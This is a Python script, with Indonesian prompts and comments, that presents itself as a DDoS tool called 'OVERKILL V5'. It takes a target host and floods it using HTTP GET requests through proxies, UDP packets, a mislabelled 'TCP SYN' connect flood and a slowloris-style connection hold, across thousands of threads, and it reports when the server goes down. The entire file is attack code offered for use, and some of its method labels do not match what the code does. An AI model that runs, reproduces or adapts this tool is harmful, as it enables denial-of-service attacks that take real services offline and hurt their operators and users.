import socket
import threading
import requests
import random
import os

# Bersihkan layar & tampilkan banner
os.system("clear")
print("""
███████╗ ██████╗ ██╗   ██╗███████╗███████╗
██╔════╝██╔═══██╗██║   ██║██╔════╝██╔════╝
█████╗  ██║   ██║██║   ██║███████╗███████╗
██╔══╝  ██║   ██║██║   ██║╚════██║╚════██║
███████╗╚██████╔╝╚██████╔╝███████║███████║
╚══════╝ ╚═════╝  ╚═════╝ ╚══════╝╚══════╝
🔥 OVERKILL V5 - DDoS Ultimate By Alvin 🔥
""")

# Load User-Agent
with open("useragent.txt", "r") as ua_file:
    user_agents = ua_file.read().splitlines()

# Load Proxy
with open("proxy.txt", "r") as proxy_file:
    proxies = proxy_file.read().splitlines()

# Input target
target = input("[+] Masukkan URL/IP Target: ")
port = int(input("[+] Masukkan Port Target (default: 80): ") or 80)
target_ip = socket.gethostbyname(target)
method = input("[+] Pilih Metode (http/tcp/udp/syn/slowloris/all): ").strip().lower()
threads = int(input("[+] Masukkan jumlah thread (default: 10000): ") or 10000)
packet_size = int(input("[+] Masukkan ukuran paket (1024-65535): ") or 65535)

# Cek Status Target
def cek_status():
    try:
        res = requests.get(f"http://{target}", timeout=5)
        code = res.status_code
        if code == 200:
            return "✅ 200 (OK)"
        elif code == 403:
            return "🟡 403 (Forbidden)"
        elif code == 404:
            return "🔴 404 (Not Found)"
        elif code >= 500:
            return "🔥 500+ (Server Error)"
        else:
            return f"⚠️ {code} (Unknown)"
    except:
        return "❌ TIMEOUT"

# Metode 1: HTTP GET Flood dengan Proxy
def http_attack():
    while True:
        try:
            proxy = {"http": "http://" + random.choice(proxies)}
            headers = {"User-Agent": random.choice(user_agents)}
            res = requests.get(f"http://{target}", headers=headers, proxies=proxy, timeout=5)
            print(f"[⚡] HTTP Attack {target_ip} - Status: {res.status_code} - Proxy: {proxy}")
        except:
            print(f"[✘] HTTP Error!")

# Metode 2: UDP Flood
def udp_attack():
    data = random._urandom(packet_size)
    while True:
        try:
            soc = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            soc.sendto(data, (target_ip, port))
            print(f"[💣] UDP Attack {target_ip}:{port} - {len(data)} bytes")
        except:
            print(f"[✘] UDP Error!")

# Metode 3: TCP SYN Flood
def tcp_syn_attack():
    while True:
        try:
            soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            soc.connect((target_ip, port))
            soc.sendto(b"SYN".rjust(packet_size), (target_ip, port))
            print(f"[🚀] TCP SYN Attack {target_ip}:{port} - {packet_size} bytes")
            soc.close()
        except:
            print(f"[✘] TCP Error!")

# Metode 4: Slowloris Attack
def slowloris_attack():
    sockets = []
    for _ in range(500000):
        try:
            soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            soc.connect((target_ip, port))
            soc.send(f"GET / HTTP/1.1\r\n".encode("utf-8"))
            sockets.append(soc)
            print(f"[🐢] Slowloris {target_ip}:{port} - {len(sockets)} Connections Open")
        except:
            print(f"[✘] Slowloris Error!")

# Multi-Threading untuk Semua Metode
for i in range(threads):
    if method == "http" or method == "all":
        threading.Thread(target=http_attack).start()

    if method == "udp" or method == "all":
        threading.Thread(target=udp_attack).start()

    if method == "tcp" or method == "all":
        threading.Thread(target=tcp_syn_attack).start()

    if method == "slowloris" or method == "all":
        threading.Thread(target=slowloris_attack).start()

# Auto-Detect DOWN
def auto_detect_down():
    while True:
        status = cek_status()
        if "❌" in status or "🔴" in status or "🔥" in status:
            print(f"[💀] SERVER BENAR-BENAR DOWN ({status})!")
            break

threading.Thread(target=auto_detect_down).start()
